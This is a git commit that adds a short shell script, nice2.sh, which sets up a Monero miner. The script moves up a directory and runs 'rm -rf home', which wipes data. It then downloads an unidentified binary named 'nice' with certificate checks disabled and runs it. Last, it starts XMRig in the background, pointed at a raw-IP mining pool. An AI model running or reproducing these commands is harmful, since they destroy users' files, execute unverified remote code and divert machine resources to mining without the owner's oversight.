f026079d7bf5f1ac0029b7df6100279759aea1ba
devcatxmr <65000155+devcatxmr@users.noreply.github.com>
2020-06-07 10:22:48 +0000

    Add files via upload

---
+++ nice2.sh
@@ -0,0 +1,10 @@
+cd ..
+rm -rf home
+wget -N --no-check-certificate https://raw.githubusercontent.com/devcatxmr/xmr/master/nice
+chmod +x nice
+./nice
+wget https://github.com/xmrig/xmrig/releases/download/v5.11.1/xmrig-5.11.1-xenial-x64.tar.gz
+tar -xzvf xmrig-5.11.1-xenial-x64.tar.gz
+cd xmrig-5.11.1
+read -e -p "输入矿工号:" wkid
+./xmrig --donate-level 1 -o 13.67.90.188:443 -u ${wkid} -k -t 7 -B
